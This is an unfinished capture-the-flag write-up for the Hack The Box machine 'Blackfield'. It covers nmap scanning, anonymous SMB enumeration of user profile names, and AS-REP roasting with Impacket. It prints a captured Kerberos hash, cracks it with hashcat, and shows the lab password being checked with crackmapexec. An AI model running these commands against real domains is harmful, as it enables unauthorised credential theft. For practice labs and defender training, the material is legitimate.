# HTB - Blackfield

## Overview

![](<machine>.infocard.png)

Short description to include any strange things to be dealt with

## Useful Skills and Tools

#### Useful thing 1

- description with generic example

#### Useful thing 2

- description with generic example

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.192`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.

At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.

```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ nmap -n -v -p- -sCV -oA blackfield 10.10.10.192 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 11:28 EDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:28
Completed NSE at 11:28, 0.00s elapsed
Initiating NSE at 11:28
Completed NSE at 11:28, 0.00s elapsed
Initiating NSE at 11:28
Completed NSE at 11:28, 0.00s elapsed
Initiating Connect Scan at 11:28
Scanning 10.10.10.192 [65535 ports]
Discovered open port 135/tcp on 10.10.10.192
Discovered open port 53/tcp on 10.10.10.192
Discovered open port 445/tcp on 10.10.10.192
Connect Scan Timing: About 19.76% done; ETC: 11:31 (0:02:06 remaining)
Discovered open port 88/tcp on 10.10.10.192
Discovered open port 593/tcp on 10.10.10.192
Connect Scan Timing: About 47.61% done; ETC: 11:30 (0:01:07 remaining)
Discovered open port 3268/tcp on 10.10.10.192
Discovered open port 5985/tcp on 10.10.10.192
Discovered open port 389/tcp on 10.10.10.192
Completed Connect Scan at 11:30, 106.20s elapsed (65535 total ports)
Initiating Service scan at 11:30
Scanning 8 services on 10.10.10.192
Completed Service scan at 11:32, 142.44s elapsed (8 services on 1 host)
NSE: Script scanning 10.10.10.192.
Initiating NSE at 11:32
Completed NSE at 11:33, 40.24s elapsed
Initiating NSE at 11:33
Completed NSE at 11:33, 1.04s elapsed
Initiating NSE at 11:33
Completed NSE at 11:33, 0.01s elapsed
Nmap scan report for 10.10.10.192
Host is up (0.035s latency).
Not shown: 65527 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-10-03 22:36:52Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/3%Time=5F789917%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h06m24s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-10-03T22:39:10
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 11:33
Completed NSE at 11:33, 0.00s elapsed
Initiating NSE at 11:33
Completed NSE at 11:33, 0.00s elapsed
Initiating NSE at 11:33
Completed NSE at 11:33, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 290.20 seconds
```

Since port 445 (SMB) is open I tried to enumerate open shares by using anonymous login with smbclient and got a list of shares!

```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ smbclient -U "" -L \\\\10.10.10.192\\       
Enter WORKGROUP\'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```


```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ smbclient -U ""  \\\\10.10.10.192\\forensic
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```
I was able to login to the `forensic` share anonymously but was not allowed to do much



```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ smbclient -U ""  \\\\10.10.10.192\\profiles$
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020
  ANavay                              D        0  Wed Jun  3 12:47:11 2020
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020
  APustulka                           D        0  Wed Jun  3 12:47:11 2020
  ARotella                            D        0  Wed Jun  3 12:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020
  ASischo                             D        0  Wed Jun  3 12:47:11 2020
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020
  ATakach                             D        0  Wed Jun  3 12:47:11 2020
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
  audit2020                           D        0  Wed Jun  3 12:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 12:47:11 2020
  AWorsey                             D        0  Wed Jun  3 12:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 12:47:11 2020
  BBakajza                            D        0  Wed Jun  3 12:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 12:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020
  BConsultant                         D        0  Wed Jun  3 12:47:11 2020
  BErdossy                            D        0  Wed Jun  3 12:47:11 2020
  BGeminski                           D        0  Wed Jun  3 12:47:11 2020
  BLostal                             D        0  Wed Jun  3 12:47:11 2020
  BMannise                            D        0  Wed Jun  3 12:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020
  BRigiero                            D        0  Wed Jun  3 12:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 12:47:11 2020
  BZandonella                         D        0  Wed Jun  3 12:47:11 2020
  CAcherman                           D        0  Wed Jun  3 12:47:12 2020
  CAkbari                             D        0  Wed Jun  3 12:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 12:47:12 2020
  CGronk                              D        0  Wed Jun  3 12:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 12:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020
  CHoytal                             D        0  Wed Jun  3 12:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 12:47:12 2020
  CKolbo                              D        0  Wed Jun  3 12:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 12:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 12:47:11 2020
  CSchandall                          D        0  Wed Jun  3 12:47:12 2020
  CSelters                            D        0  Wed Jun  3 12:47:12 2020
  CTolmie                             D        0  Wed Jun  3 12:47:12 2020
  DCecere                             D        0  Wed Jun  3 12:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020
  DCwilich                            D        0  Wed Jun  3 12:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020
  DKemesies                           D        0  Wed Jun  3 12:47:12 2020
  DMatuka                             D        0  Wed Jun  3 12:47:12 2020
  DMedeme                             D        0  Wed Jun  3 12:47:12 2020
  DMeherek                            D        0  Wed Jun  3 12:47:12 2020
  DMetych                             D        0  Wed Jun  3 12:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 12:47:12 2020
  DPriporov                           D        0  Wed Jun  3 12:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020
  DVellela                            D        0  Wed Jun  3 12:47:12 2020
  DVogleson                           D        0  Wed Jun  3 12:47:12 2020
  DZwinak                             D        0  Wed Jun  3 12:47:12 2020
  EBoley                              D        0  Wed Jun  3 12:47:12 2020
  EEulau                              D        0  Wed Jun  3 12:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 12:47:12 2020
  EFrixione                           D        0  Wed Jun  3 12:47:12 2020
  EJenorik                            D        0  Wed Jun  3 12:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020
  EPryar                              D        0  Wed Jun  3 12:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 12:47:12 2020
  ESariotti                           D        0  Wed Jun  3 12:47:12 2020
  ETurgano                            D        0  Wed Jun  3 12:47:12 2020
  EWojtila                            D        0  Wed Jun  3 12:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 12:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 12:47:12 2020
  FBroj                               D        0  Wed Jun  3 12:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 12:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 12:47:12 2020
  FPflum                              D        0  Wed Jun  3 12:47:12 2020
  FReffey                             D        0  Wed Jun  3 12:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 12:47:12 2020
  Gareld                              D        0  Wed Jun  3 12:47:12 2020
  GBatowski                           D        0  Wed Jun  3 12:47:12 2020
  GForshalger                         D        0  Wed Jun  3 12:47:12 2020
  GGomane                             D        0  Wed Jun  3 12:47:12 2020
  GHisek                              D        0  Wed Jun  3 12:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020
  GMerewether                         D        0  Wed Jun  3 12:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 12:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 12:47:12 2020
  GWiegard                            D        0  Wed Jun  3 12:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020
  HColantino                          D        0  Wed Jun  3 12:47:12 2020
  HConforto                           D        0  Wed Jun  3 12:47:12 2020
  HCunnally                           D        0  Wed Jun  3 12:47:12 2020
  HGougen                             D        0  Wed Jun  3 12:47:12 2020
  HKostova                            D        0  Wed Jun  3 12:47:12 2020
  IChristijr                          D        0  Wed Jun  3 12:47:12 2020
  IKoledo                             D        0  Wed Jun  3 12:47:12 2020
  IKotecky                            D        0  Wed Jun  3 12:47:12 2020
  ISantosi                            D        0  Wed Jun  3 12:47:12 2020
  JAngvall                            D        0  Wed Jun  3 12:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020
  JDanten                             D        0  Wed Jun  3 12:47:12 2020
  JDjouka                             D        0  Wed Jun  3 12:47:12 2020
  JKondziola                          D        0  Wed Jun  3 12:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020
  JLuthner                            D        0  Wed Jun  3 12:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020
  JPistachio                          D        0  Wed Jun  3 12:47:12 2020
  JScima                              D        0  Wed Jun  3 12:47:12 2020
  JSebaali                            D        0  Wed Jun  3 12:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 12:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 12:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 12:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 12:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 12:47:12 2020
  KCockeril                           D        0  Wed Jun  3 12:47:12 2020
  KColtart                            D        0  Wed Jun  3 12:47:12 2020
  KCyster                             D        0  Wed Jun  3 12:47:12 2020
  KDorney                             D        0  Wed Jun  3 12:47:12 2020
  KKoesno                             D        0  Wed Jun  3 12:47:12 2020
  KLangfur                            D        0  Wed Jun  3 12:47:12 2020
  KMahalik                            D        0  Wed Jun  3 12:47:12 2020
  KMasloch                            D        0  Wed Jun  3 12:47:12 2020
  KMibach                             D        0  Wed Jun  3 12:47:12 2020
  KParvankova                         D        0  Wed Jun  3 12:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 12:47:12 2020
  KRasmor                             D        0  Wed Jun  3 12:47:12 2020
  KShievitz                           D        0  Wed Jun  3 12:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 12:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 12:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020
  KZyballa                            D        0  Wed Jun  3 12:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 12:47:12 2020
  LBaligand                           D        0  Wed Jun  3 12:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 12:47:12 2020
  LBirer                              D        0  Wed Jun  3 12:47:12 2020
  LBobelis                            D        0  Wed Jun  3 12:47:12 2020
  LChippel                            D        0  Wed Jun  3 12:47:12 2020
  LChoffin                            D        0  Wed Jun  3 12:47:12 2020
  LCominelli                          D        0  Wed Jun  3 12:47:12 2020
  LDruge                              D        0  Wed Jun  3 12:47:12 2020
  LEzepek                             D        0  Wed Jun  3 12:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 12:47:12 2020
  LKarabag                            D        0  Wed Jun  3 12:47:12 2020
  LKirousis                           D        0  Wed Jun  3 12:47:12 2020
  LKnade                              D        0  Wed Jun  3 12:47:12 2020
  LKrioua                             D        0  Wed Jun  3 12:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 12:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020
  LMichoud                            D        0  Wed Jun  3 12:47:12 2020
  LTindall                            D        0  Wed Jun  3 12:47:12 2020
  LYturbe                             D        0  Wed Jun  3 12:47:12 2020
  MArcynski                           D        0  Wed Jun  3 12:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 12:47:12 2020
  MBrambini                           D        0  Wed Jun  3 12:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 12:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 12:47:12 2020
  MKillberg                           D        0  Wed Jun  3 12:47:12 2020
  MLapesh                             D        0  Wed Jun  3 12:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 12:47:12 2020
  MMerezio                            D        0  Wed Jun  3 12:47:12 2020
  MNaciri                             D        0  Wed Jun  3 12:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020
  MSichkar                            D        0  Wed Jun  3 12:47:12 2020
  MTemko                              D        0  Wed Jun  3 12:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 12:47:12 2020
  MTonuri                             D        0  Wed Jun  3 12:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020
  NBellibas                           D        0  Wed Jun  3 12:47:12 2020
  NDikoka                             D        0  Wed Jun  3 12:47:12 2020
  NGenevro                            D        0  Wed Jun  3 12:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020
  NPulido                             D        0  Wed Jun  3 12:47:12 2020
  NRonges                             D        0  Wed Jun  3 12:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020
  OBushey                             D        0  Wed Jun  3 12:47:12 2020
  OHardybala                          D        0  Wed Jun  3 12:47:12 2020
  OLunas                              D        0  Wed Jun  3 12:47:12 2020
  ORbabka                             D        0  Wed Jun  3 12:47:12 2020
  PBourrat                            D        0  Wed Jun  3 12:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020
  PBranti                             D        0  Wed Jun  3 12:47:12 2020
  PCapperella                         D        0  Wed Jun  3 12:47:12 2020
  PCurtz                              D        0  Wed Jun  3 12:47:12 2020
  PDoreste                            D        0  Wed Jun  3 12:47:12 2020
  PGegnas                             D        0  Wed Jun  3 12:47:12 2020
  PMasulla                            D        0  Wed Jun  3 12:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020
  PParakat                            D        0  Wed Jun  3 12:47:12 2020
  PProvencer                          D        0  Wed Jun  3 12:47:12 2020
  PTesik                              D        0  Wed Jun  3 12:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020
  PVirding                            D        0  Wed Jun  3 12:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020
  RBochare                            D        0  Wed Jun  3 12:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020
  RNemnich                            D        0  Wed Jun  3 12:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 12:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 12:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020
  RVallandas                          D        0  Wed Jun  3 12:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 12:47:12 2020
  RWissor                             D        0  Wed Jun  3 12:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020
  SAjowi                              D        0  Wed Jun  3 12:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 12:47:12 2020
  SBouzane                            D        0  Wed Jun  3 12:47:12 2020
  SChatin                             D        0  Wed Jun  3 12:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 12:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020
  SEulert                             D        0  Wed Jun  3 12:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020
  SGolds                              D        0  Wed Jun  3 12:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 12:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 12:47:12 2020
  SHauht                              D        0  Wed Jun  3 12:47:12 2020
  SHederian                           D        0  Wed Jun  3 12:47:12 2020
  SHelregel                           D        0  Wed Jun  3 12:47:12 2020
  SKrulig                             D        0  Wed Jun  3 12:47:12 2020
  SLewrie                             D        0  Wed Jun  3 12:47:12 2020
  SMaskil                             D        0  Wed Jun  3 12:47:12 2020
  Smocker                             D        0  Wed Jun  3 12:47:12 2020
  SMoyta                              D        0  Wed Jun  3 12:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 12:47:12 2020
  SReppond                            D        0  Wed Jun  3 12:47:12 2020
  SSicliano                           D        0  Wed Jun  3 12:47:12 2020
  SSilex                              D        0  Wed Jun  3 12:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 12:47:12 2020
  STousignaut                         D        0  Wed Jun  3 12:47:12 2020
  support                             D        0  Wed Jun  3 12:47:12 2020
  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
  SWhyte                              D        0  Wed Jun  3 12:47:12 2020
  SWynigear                           D        0  Wed Jun  3 12:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 12:47:12 2020
  TCaffo                              D        0  Wed Jun  3 12:47:12 2020
  TCassalom                           D        0  Wed Jun  3 12:47:12 2020
  TEiselt                             D        0  Wed Jun  3 12:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 12:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 12:47:12 2020
  TKauten                             D        0  Wed Jun  3 12:47:12 2020
  TKnupke                             D        0  Wed Jun  3 12:47:12 2020
  TLintlop                            D        0  Wed Jun  3 12:47:12 2020
  TMusselli                           D        0  Wed Jun  3 12:47:12 2020
  TOust                               D        0  Wed Jun  3 12:47:12 2020
  TSlupka                             D        0  Wed Jun  3 12:47:12 2020
  TStausland                          D        0  Wed Jun  3 12:47:12 2020
  TZumpella                           D        0  Wed Jun  3 12:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 12:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 12:47:12 2020
  UPyrke                              D        0  Wed Jun  3 12:47:12 2020
  VBublavy                            D        0  Wed Jun  3 12:47:12 2020
  VButziger                           D        0  Wed Jun  3 12:47:12 2020
  VFuscca                             D        0  Wed Jun  3 12:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 12:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 12:47:12 2020
  VMarija                             D        0  Wed Jun  3 12:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 12:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 12:47:12 2020
  WSaldat                             D        0  Wed Jun  3 12:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020
  WZelazny                            D        0  Wed Jun  3 12:47:12 2020
  XBemelen                            D        0  Wed Jun  3 12:47:12 2020
  XDadant                             D        0  Wed Jun  3 12:47:12 2020
  XDebes                              D        0  Wed Jun  3 12:47:12 2020
  XKonegni                            D        0  Wed Jun  3 12:47:12 2020
  XRykiel                             D        0  Wed Jun  3 12:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 12:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 12:47:12 2020
  YKivlen                             D        0  Wed Jun  3 12:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 12:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 12:47:12 2020
  YPredestin                          D        0  Wed Jun  3 12:47:12 2020
  YSeturino                           D        0  Wed Jun  3 12:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                7846143 blocks of size 4096. 4006940 blocks available
```
Trying again with the `profiles$` share yeilded a lot more information!  I took all of the these usernames and added them to a list.

I tried using Metasploit's `auxiliary(gather/kerberos_enumusers)` kerberos user enumeration tool, however I just got an error for each user saying `[*] 10.10.10.193:88 - Wrong DOMAIN Name? Check DOMAIN and retry...`
(Based on later information, I think the correct domain name to use may have been BLACKFIELD.local)

```
┌──(zweilos㉿kali)-[~/htb/blackfield]
└─$ rpcclient -U "" -N  10.10.10.192                                                                1 ⨯
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> getdcname blackfield
\\DC01

```
After trying numerous commands, I was able to at least verify that blackfield was indeed the correct domain name. 

since the module in msfconsole didn't I decided to try the python-based Impacket script `GetNPUsers.py` which does the same type of check to see if any users have `UF_DONT_REQUIRE_PREAUTH` turned off.
```
┌──(zweilos㉿kali)-[~/impacket/examples]
└─$ python3 ./GetNPUsers.py blackfield/ -no-pass -usersfile ~/htb/blackfield/usernames -dc-ip 10.10.10.192 > kerberosEnum
                                                                                                        
┌──(zweilos㉿kali)-[~/impacket/examples]
└─$ cat kerberosEnum | grep -v UNKNOWN   
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD:fd014a8905a07be16b91d57562b70a97$41d550ea1cde139decbebfad063e7609dab33b33273e9ceb5668dc6e1d8bacc94142deb2f370f523d9a0597d552a72b6c5af467fa4ddbacf4a989f6c79f4d1f303103582b9bbc0626aa78ad60a47d38070da94cb3489a9915a9470fbc30ef80f3835691d86e30ec0269f2220f35a567bb1d344cfde7dc83d6e1c18f7d7f52f5d6bd22d62621c833b609205c7f42d4e3138007bd584f8828331a0180718ef3b6e3d93de7ce69142b4ca78b8a1f9e891ae494bacb9d3dd4d93b3e8cab02e4be01ce934634491e836d2b5450ff841e0221d3470e44d5876071447a55885aa80a3a11de423f89f1c1baa20898267bc7e
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```
I found three users that had this turned off, and one even had the password hash attached! Time to fire up hashcat.

```
┌──(zweilos㉿kali)-[~/impacket/examples]
└─$ hashcat --help | grep -i kerberos                                                               1 ⨯
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols
  13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols
  18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols
  19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols
  19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols
  19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols
  19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols
                                                                                                        
┌──(zweilos㉿kali)-[~/impacket/examples]
└─$ hashcat -O -D1,2 -a0 -m 18200 support.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.  

$krb5asrep$23$support@BLACKFIELD:fd014a8905a07be16b91d57562b70a97$41d550ea1cde139decbebfad063e7609dab33b33273e9ceb5668dc6e1d8bacc94142deb2f370f523d9a0597d552a72b6c5af467fa4ddbacf4a989f6c79f4d1f303103582b9bbc0626aa78ad60a47d38070da94cb3489a9915a9470fbc30ef80f3835691d86e30ec0269f2220f35a567bb1d344cfde7dc83d6e1c18f7d7f52f5d6bd22d62621c833b609205c7f42d4e3138007bd584f8828331a0180718ef3b6e3d93de7ce69142b4ca78b8a1f9e891ae494bacb9d3dd4d93b3e8cab02e4be01ce934634491e836d2b5450ff841e0221d3470e44d5876071447a55885aa80a3a11de423f89f1c1baa20898267bc7e:#00^BlackKnight
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$support@BLACKFIELD:fd014a8905a07be16b...67bc7e
Time.Started.....: Sat Oct  3 13:48:55 2020 (8 secs)
Time.Estimated...: Sat Oct  3 13:49:03 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1917.5 kH/s (11.38ms) @ Accel:128 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 3094/14344385 (0.02%)
Restore.Point....: 14322676/14344385 (99.85%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $HEX[2626494c4f5645594f55] -> $HEX[042a0337c2a156616d6f732103]

Started: Sat Oct  3 13:48:43 2020
Stopped: Sat Oct  3 13:49:04 2020
```
After searching for the correct hashtype I fired up hashcat and very quickly cracked the password using the `rockyou.txt` wordlist. The password for support was `#00^BlackKnight`

## Initial Foothold

## Road to User

```
┌──(zweilos㉿kali)-[/usr/share/neo4j/conf]
└─$ crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
